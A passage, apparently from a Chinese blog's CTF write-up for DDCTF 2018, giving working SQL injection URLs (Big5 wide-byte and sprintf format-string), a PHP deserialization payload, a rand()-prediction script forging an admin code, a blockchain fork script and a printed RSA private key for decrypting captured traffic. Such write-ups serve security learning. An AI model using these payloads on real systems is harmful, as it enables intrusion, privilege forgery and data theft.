Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n```\n该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可\n\n```\nString ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nFileInputStream inputStream = new FileInputStream(ksPath);\nkeyStore.load(inputStream, p.toCharArray());\nKey key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n```\n然后就可以解密得到flag.\n> DDCTF{5218295657878818503}\n\n# 注入的奥妙\n## sql注入\n首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号\"‘\"，发现输出竟然乱码。\n\n ![avatar](/images/ddctf/20180421195946.png)\n\n 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。\n\n ![avatar](/images/ddctf/20180421200130.png)\n\n 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\n\n ![avatar](/images/ddctf/20180421200307.png)\n\n 我选择了\"么\"\n\n ![avatar](/images/ddctf/20180421200748.png)\n\n 通过测试\"http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88'\"，可以看到单引号成功逃逸。\n\n```\n\n 最后拼接的参数是 : ?\\\\'\n​~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~\n很遗憾没有找到数据 可以试试别的 ！\n42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''?\\\\''' at line 1\n```\n单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加\"collate utf8_general_cli\",强制转换编码即可。\n\n* 获取数据库。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  \n   得到结果\"sqli\"\n* 获取'sqli'下的table。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  \n   得到结果\"message,route_rules\"\n* 获取\"route_rules\"的列名。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  \n   得到结果\"id,pattern,action,rulepass\"\n* 然后获取route_rules表中的数据。\n   数据如下:  \n   1   get*/   u/well/getmessage/   \n   12  get*/   u/justtry/self/  \n   13  post*/  u/justtry/try  \n   15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip\n\n## 代码审计\n通过上边的\"116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css\"，可以拿到代码。\n\n+ Jusstry.php\n\n```\npublic function try($serialize)\n{\n    unserialize(urldecode($serialize), [\"allowed_classes\" => [\"Index\\Helper\\Flag\", \"Index\\Helper\\SQL\",\"Index\\Helper\\Test\"]]);\n}\n```\n通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。\n\n+ Flag.php\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse PDO;\nuse Index\\Helper\\SQL;\n\ndefined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n\n    //\n    public function get($user)\n    {\n\n        $tmp=$this->sql->FlagGet($user);\n        if ($tmp['status']===1) {\n            return $this->sql->FlagGet($user)['flag'];\n        }\n    }\n}\n\n```\n该类说明只要调用get方法就可以得到指定用户的flag。\n\n+ Test.php\n\n```\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        $this->getflag('ctfuser', $this->user_uuid);\n    }\n\n    public function setflag($m = 'ctfuser', $u = 'default', $o = 'default')\n    {\n        $user=array(\n            'name' => $m,\n            'oldid' => $o,\n            'id' => $u\n        );\n        // var_dump($user);\n\n        echo $this->fl->set($user, 2);\n    }\n\n    public function getflag($m = 'ctfuser', $u = 'default')\n    {\n        //TODO: check username\n        $user=array(\n            'name' => $m,\n            'id' => $u\n        );\n        //懒了直接输出给你们了\n        echo 'DDCTF{'.$this->fl->get($user).'}';\n    }\n}\n```\n在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\"，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse Index\\Helper\\Flag;\nuse Index\\Helper\\UUID;\n\nclass SQL\n{\n    public $dbc;\n    public $pdo;\n\n    //\n    public function __construct()\n    {\n    }\n}\n\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n}\n\n\n// defined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        // $this->getflag('ctfuser', $this->user_uuid);\n    }\n}\n\necho serialize(new Test());\n```\n即可得到序列化之后的值:\"hhkjjhkhjkhjkhkjhkhkhkO:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}}\",然后就可以得到flag了。\n\n ![avatar](/images/ddctf/20180421150038.png)\n\n# mini blockchain\n## 构造符合条件的区块\n```\nimport json\nimport hashlib\nfrom itertools import product\nimport string\nfrom functools import reduce\nimport rsa\n\nEMPTY_HASH = '0' * 64\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n\n\ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n\n\ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'],\n                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n\nblock = {\n    \"nonce\": \"6h0F\",\n    \"prev\": \"0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8\",\n    \"transactions\": []\n  }\n\nc = string.ascii_lowercase + \"0123456789ABCDEFGHI\"\n\ncaptchas = [''.join(i) for i in product(c, repeat=4)]\n\nprint('[+] Genering {} captchas...'.format(len(captchas)))\nwith open('captchas.txt', 'w') as f:\n    for k in captchas:\n        block[\"nonce\"] = k\n        f.write(hash_block(block)[:5] + ' --> ' + k + '\\n')\n```\n\"nonce\"值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。\n\n## 解题\n初始区块链如图所示:\n\n ![avatar](/images/ddctf/20180421221550.png)\n\n然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block['height']来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。\n\n```\ndef find_blockchain_tail():\n    return max(session['blocks'].values(), key=lambda block: block['height'])\n```\n\n ![avatar](/images/ddctf/20180421222032.png)\n\n从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。\n\n ![avatar](/images/ddctf/20180421222814.png)\n\n接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。\n\n ![avatar](/images/ddctf/20180421223014.png)\n\n需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。\n\n# 我的博客\n## 审计代码\n根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。\n### index.php\n\n```\nif(isset($_GET['id'])){\n    $id = addslashes($_GET['id']);\n    if(isset($_GET['title'])){\n        $title = addslashes($_GET['title']);\n        $title = sprintf(\"AND title='%s'\", $title);\n    }else{\n        $title = '';\n    }\n    $sql = sprintf(\"SELECT * FROM article WHERE id='%s' $title\", $id);\n\n    foreach ($pdo->query($sql) as $row) {\n        echo \"<h1>\".$row['title'].\"</h1><br>\".$row['content'];\n        die();\n    }\n}\n```\n可以看到该地方使用了两次sprintf，可以立马想到[从WordPress SQLi谈PHP格式化字符串问题](https://paper.seebug.org/386/),问题就是，需要以admin的身份登录。\n\n### login.php\n\n```\nif($_SERVER['REQUEST_METHOD'] === \"POST\") {\n    if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] !== $password) {\n        die('wrong password');\n    }\n\n    $sth = $pdo->prepare('SELECT `identity` FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] === \"admin\") {\n        $_SESSION['is_admin'] = true;\n    } else {\n        $_SESSION['is_admin'] = false;\n    }\n\n    #echo $username;\n    header(\"Location: index.php\");\n}\n```\nlogin部分使用pdo进行查询，并且字符串之间的比较也是\"===\"，不可能存在任何漏洞。\n\n### register.php\n\n```\nif(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n    \n    $admin = \"admin###\" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32);\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch() !== false) {\n        die('username has been registered');\n    }\n\n    if($code === $admin) {\n        $identity = \"admin\";\n    } else {\n        $identity = \"guest\";\n    }\n\n    $sth = $pdo->prepare('INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)');\n    $sth->execute([':username' => $username, ':password' => $password, ':identity' => $identity]);\n\n    echo '<script>alert(\"register success\");location.href=\"./login.php\"</script>';\n} else {\n```\n\nregister部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。\n\n```\n<input type=\"hidden\" name=\"csrf\" id=\"csrf\" value=\"<?php $_SESSION['csrf'] = (string)rand();echo $_SESSION['csrf']; ?>\" required>\n<label for=\"inputUsername\" class=\"sr-only\">Username</label>\n```\n\n可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找[Web应用隐形后门的设计与实现](https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html)。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。\n\n## 解题\n现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，[http://www.vuln.cn/6004](http://www.vuln.cn/6004),文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。\n\n```\n#!php\nstate[i] = state[i-3] + state[i-31]\nreturn state[i] % 2147483648\n```\n\n同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。\n\n此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。\n\n```\nstatic void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */\n{\n\tlong n_elems, rnd_idx, n_left;\n\tchar temp;\n\t/* The implementation is stolen from array_data_shuffle       */\n\t/* Thus the characteristics of the randomization are the same */\n\tn_elems = len;\n\n\tif (n_elems <= 1) {\n\t\treturn;\n\t}\n\n\tn_left = n_elems;\n\n\twhile (--n_left) {\n\t\trnd_idx = php_rand(TSRMLS_C);\n\t\tRAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);\n\t\tif (rnd_idx != n_left) {\n\t\t\ttemp = str[n_left];\n\t\t\tstr[n_left] = str[rnd_idx];\n\t\t\tstr[rnd_idx] = temp;\n\t\t}\n\t}\n}\n\n```\n其中RAND_RANGE函数的实现如下:\n\n```\n#define RAND_RANGE(__n, __min, __max, __tmax) \\\n(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))\n\n```\n准备工作就绪，就可以编写代码了。\n代码如下:\n\n```\nimport requests\nfrom lxml import etree\n\nurl = \"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php\"\n\ndata = {\n    'username': 'dida',\n    'password': 'dida',\n    'csrf': '2086003527',\n    'code': ''\n}\n\ndef get_csrf(html):\n    html = etree.HTML(html)\n    token = html.xpath('//*[@id=\"csrf\"]')[0].get('value')\n    return token\n\n\ndef rand_range(rand, n_left):\n     return int((n_left + 1.0) * (rand / (2147483648.0)))\n\n\ndef shuffle(calc_rand):\n    str = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    str_temp = list(str)\n    str_len = len(str_temp)\n    n_left = str_len - 1\n    temp = \"\"\n    while n_left:\n        randdata = calc_rand[61 - n_left]\n        index = rand_range(randdata, n_left)\n        if index != n_left:\n            temp = str_temp[n_left]\n            str_temp[n_left] = str_temp[index]\n            str_temp[index] = temp\n        n_left = n_left - 1\n\n    return \"\".join(str_temp)\n\nwhile 1:\n    s = requests.session()\n    l = []\n    for i in range(33):\n        res = s.get(url)\n        token = get_csrf(res.content)\n        l.append(token)\n\n    calc_rand = []\n    temp_calc_rand = []\n    for i in range(33, 95):\n        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648\n        l.append(value)\n        temp_calc_rand.append(value)\n\n    str = \"admin###\" + shuffle(temp_calc_rand)[0:32]\n    data['code'] = str\n    data['csrf'] = l[32]\n\n    res = s.post(url = url, data = data)\n    print(res.content)\n    break\n```\n运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。\n\n登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。\n基本的payload如下:\n>http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&title=%1$' or 2=1 union select 1,2,3%23\n\n最后得到flag: ```DDCTF{9b7ccc1e96387b5ce079adab2fb08022}```\n\n","slug":"ddctf","published":1,"updated":"2018-06-13T11:06:41.112Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jou0005ly4j39200hbc","content":"<h1 id=\"签到题目\"><a href=\"#签到题目\" class=\"headerlink\" title=\"签到题目:\"></a>签到题目:</h1><p>复制，粘贴</p>\n<h1 id=\"╯°□°）╯︵-┻━┻\"><a href=\"#╯°□°）╯︵-┻━┻\" class=\"headerlink\" title=\"(╯°□°）╯︵ ┻━┻\"></a>(╯°□°）╯︵ ┻━┻</h1><p>题目给了一个字符串</p>\n<pre><code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n</code></pre><p>首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，”DD”两个字符，在字符串中找到两组相邻的字符串，找到了”c4c4”和”e1e1”：</p>\n<p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</p>\n<p>进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示”DD”, 然后以此类推：</p>\n<p><img src=\"/images/ddctf/20180420150038.png\" alt=\"avatar\"></p>\n<h1 id=\"第四扩展FS\"><a href=\"#第四扩展FS\" class=\"headerlink\" title=\"第四扩展FS\"></a>第四扩展FS</h1><ol>\n<li>下载下来是一张图片</li>\n</ol>\n<p>首先:<code>binwalk windows.jpg</code></p>\n<pre><code>security:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg\n\nDECIMAL         HEX             DESCRIPTION\n-------------------------------------------------------------------------------------------------------\n30              0x1E            TIFF image data, big-endian\n2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes\n7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: &quot;file.txt&quot;\n7257054         0x6EBBDE        End of Zip archive\n\nProgress: 81.81% (10890274 / 13310878)\n</code></pre><p>可以看到图片里边有个压缩包。<br>这时候，可以使用<code>dd</code>或者<code>foremost</code>命令，来分离压缩包。</p>\n<blockquote>\n<p>dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1<br>foremost windows.jpg</p>\n</blockquote>\n<p>得到一个压缩包，然后，查看图片属性，会在详细信息-&gt;备注里看到一个字符串”Pactera”，估计就是密码。</p>\n<ol>\n<li>然后打开file.txt</li>\n</ol>\n<p><img src=\"/images/ddctf/20180420151247.png\" alt=\"avatar\"><br>可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。</p>\n<pre><code>grep -o . file.txt | sort |uniq -c | sort -rn\n</code></pre><p><img src=\"/images/ddctf/20180420151941.png\" alt=\"avatar\"></p>\n<p>然后从新组合一下，就得到flag了。</p>\n<pre><code>DDCTF{ZuozHengqU3dEshi}\n</code></pre><a id=\"more\"></a>\n<h1 id=\"流量分析\"><a href=\"#流量分析\" class=\"headerlink\" title=\"流量分析\"></a>流量分析</h1><p>这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。<br>过程如下:<br>首先大体上浏览整个数据包，会发现，大体上就是3个部分:  </p>\n<ul>\n<li>ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  </li>\n<li>邮件相关的数据包</li>\n<li>https相关的包，由于只有几个，竟然被我选择性忽略了。</li>\n</ul>\n<h2 id=\"ftp之Fl-g-zxip\"><a href=\"#ftp之Fl-g-zxip\" class=\"headerlink\" title=\"ftp之Fl-g.zxip\"></a>ftp之Fl-g.zxip</h2><blockquote>\n<p>tcp.stream eq 2004   </p>\n</blockquote>\n<p>右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。</p>\n<p>然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。</p>\n<pre><code>from scapy.all import * \npcaps = rdpcap(&quot;flag.pcap&quot;)\n\nfp = open(&quot;flag.zip&quot;, &quot;wb&quot;)\nlength = 0\nfor pcap in pcaps:\n    value = pcap[&#39;Raw&#39;].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n</code></pre><p>得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。</p>\n<h2 id=\"ftp之sqlmap-zip\"><a href=\"#ftp之sqlmap-zip\" class=\"headerlink\" title=\"ftp之sqlmap.zip\"></a>ftp之sqlmap.zip</h2><blockquote>\n<p>tcp.stream eq 2005</p>\n</blockquote>\n<p>既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。</p>\n<pre><code>from scapy.all import * \npcaps = rdpcap(&quot;sqlmap.pcap&quot;)\n\nfp = open(&quot;sqlmap.zip&quot;, &quot;wb&quot;)\nlength = 0\nfor pcap in pcaps:\n    value = pcap[&#39;Raw&#39;].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n</code></pre><p>得到了一个sqlmap.zip，第一次打开，用winrar，点击工具-&gt;修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。</p>\n<p>已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。</p>\n<p>然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。</p>\n<h2 id=\"邮件部分\"><a href=\"#邮件部分\" class=\"headerlink\" title=\"邮件部分\"></a>邮件部分</h2><p>通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:</p>\n<pre><code>Content-type: image/png; name=&quot;image001.png&quot;;\n x-mac-creator=&quot;4F50494D&quot;;\n x-mac-type=&quot;504E4766&quot;\nContent-ID: &lt;image001.png@01D38B05.8079CE40&gt;\nContent-disposition: inline;\n    filename=&quot;image001.png&quot;\nContent-transfer-encoding: base64\n</code></pre><p>下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。</p>\n<pre><code>import base64\n\nfp = open(&quot;1.txt&quot;, &quot;r&quot;)\nfp1 = open(&quot;file.png&quot;, &quot;wb&quot;)\n\nfp1.write(base64.b64decode(fp.read()))\n</code></pre><p>然后，就可以得到一个file.png。</p>\n<p><img src=\"/images/ddctf/20180425151942.png\" alt=\"avatar\"></p>\n<p>然后，就是将图片中的字符串提取出来。</p>\n<pre><code>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n</code></pre><p>再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。</p>\n<p>一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。</p>\n<h2 id=\"得到flag\"><a href=\"#得到flag\" class=\"headerlink\" title=\"得到flag\"></a>得到flag</h2><p>今天是ddctf最后一天，”喝杯java”，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。</p>\n<p>rsa密钥也就是，保存一下就行了:</p>\n<pre><code>-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n-----END RSA PRIVATE KEY-----\n</code></pre><p><img src=\"/images/ddctf/20180420184445.png\" alt=\"avatar\"></p>\n<p>然后，查看http包，flag就出来了。</p>\n<p><img src=\"/images/ddctf/20180420183706.png\" alt=\"avatar\"></p>\n<h1 id=\"数据库的秘密\"><a href=\"#数据库的秘密\" class=\"headerlink\" title=\"数据库的秘密\"></a>数据库的秘密</h1><h2 id=\"X-forwarded-for\"><a href=\"#X-forwarded-for\" 